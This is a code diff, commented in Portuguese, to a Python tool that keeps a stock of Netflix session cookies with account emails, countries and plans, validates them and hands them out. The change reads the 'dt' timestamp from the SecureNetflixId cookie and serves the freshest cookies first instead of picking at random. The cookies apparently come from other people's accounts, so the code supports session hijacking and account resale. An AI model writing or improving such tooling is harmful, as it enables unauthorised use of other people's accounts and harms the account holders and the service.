@@ -425,9 +425,19 @@ def extract_netflix_file_info(fpath: str, ignore_dead: bool = False) -> Optional
 
         cat = classify_plan(bname, plan)
 
+        cookie_dt = 0
+        sec_id = str(parsed.get("SecureNetflixId", ""))
+        dt_m = re.search(r'dt(?:%3D|=)(\d+)', sec_id)
+        if dt_m:
+            try:
+                cookie_dt = int(dt_m.group(1))
+            except Exception:
+                pass
+
         return {
             "file": fpath,
             "parsed": parsed,
+            "cookie_dt": cookie_dt,
             "info": {
                 "email": email,
                 "country": country,
@@ -474,6 +484,7 @@ def get_all_netflix_accounts() -> List[dict]:
             if meta:
                 accounts.append(meta)
 
+    accounts.sort(key=lambda a: a.get("cookie_dt", 0), reverse=True)
     return accounts
 
 def start_background_netflix_validator():
@@ -506,7 +517,7 @@ def get_verified_netflix_cookies(min_count: int = 1) -> List[dict]:
     return get_all_netflix_accounts()
 
 def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = "", exclude_email: str = "") -> Optional[dict]:
-    """Retorna o próximo cookie Netflix 100% verificado usando seleção aleatória e anti-repetição de tv2.py."""
+    """Retorna o próximo cookie Netflix verificado priorizando sempre os cookies mais recentes."""
     ex_bname = os.path.basename(exclude_file).lower() if exclude_file else ""
     ex_email = (exclude_email or "").strip().lower()
 
@@ -515,7 +526,7 @@ def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = ""
     elif exclude_email:
         tv2.LAST_USED_AT[exclude_email.lower()] = time.time()
 
-    # 1. Prioriza contas já validadas e ativas no pool de forma ALEATÓRIA
+    # 1. Prioriza contas já validadas e ativas no pool ordenadas pelos cookies mais novos
     with VALID_NETFLIX_LOCK:
         valid_candidates = []
         for entry in list(VALID_NETFLIX_POOL):
@@ -531,9 +542,10 @@ def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = ""
             valid_candidates.append(entry)
 
         if valid_candidates:
-            return random.choice(valid_candidates)
+            valid_candidates.sort(key=lambda e: e.get("cookie_dt", 0), reverse=True)
+            return valid_candidates[0]
 
-    # 2. Busca e valida ativamente via tv2 (com embaralhamento aleatório)
+    # 2. Busca e valida ativamente via tv2 (com ordenação por frescor de dt)
     cookie_data = tv2.find_next_valid_cookie(exclude_file=exclude_file, exclude_email=exclude_email)
     if cookie_data:
         f = cookie_data.get("file", "")
@@ -543,11 +555,13 @@ def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = ""
                 VALID_NETFLIX_POOL.append(cookie_data)
         return cookie_data
 
-    # 3. Fallback: sorteia diretamente de todas as contas carregadas
+    # 3. Fallback: seleciona diretamente a conta mais recente disponível no estoque
     all_nf = get_all_netflix_accounts()
     if all_nf:
         fresh = [a for a in all_nf if (not ex_bname or os.path.basename(a.get("file", "")).lower() != ex_bname) and (not ex_email or a.get("info", {}).get("email", "").lower() != ex_email)]
-        return random.choice(fresh if fresh else all_nf)
+        pool = fresh if fresh else all_nf
+        pool.sort(key=lambda a: a.get("cookie_dt", 0), reverse=True)
+        return pool[0]
 
     return None
 
